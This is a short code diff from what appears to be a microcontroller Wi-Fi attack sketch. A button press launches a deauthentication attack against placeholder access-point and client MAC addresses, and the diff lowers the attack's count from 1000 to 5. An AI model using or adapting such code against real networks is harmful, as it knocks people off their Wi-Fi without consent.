@@ -34,15 +34,13 @@ void setup(){
 }
 
 void loop(){
-    
-    
     if(!digitalRead(0)){
         MacAddress apMac = MacAddress::fromString("TARGET_AP");
         MacAddress staMac = MacAddress::fromString("TARGET_STA");
         
         led.setColor(RED);
         
-        attackService.startDeauthAttack(apMac, staMac, 1000);
+        attackService.startDeauthAttack(apMac, staMac, 5);
         
         led.setColor(GREEN);
 
